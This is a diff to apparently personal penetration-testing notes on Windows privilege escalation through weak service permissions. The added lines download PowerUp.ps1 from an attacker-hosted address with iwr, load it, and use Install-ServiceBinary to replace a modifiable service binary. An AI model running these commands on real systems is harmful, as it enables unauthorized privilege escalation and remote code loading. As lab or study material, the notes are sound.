@@ -28,12 +28,22 @@ Get list of running services
 ```powershell
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ```
+
 Check file permissions:
 
 ```powershell
-icacls 'c:\xampp\....'
+icacls 'c:\...'
 ```
 (F) - full permissions, read, write, execute
+
+or automate the process with PowerUp.ps1
+#powerup #replace-service #privesc 
+```powershell
+iwr -uri http://$LOCAL_IP/PowerUp.ps1 -Outfile PowerUp.ps1
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+Install-ServiceBinary -Name '$SERVICE'
+```
 Search for passwords inside the registry
 ---
 ```powershell
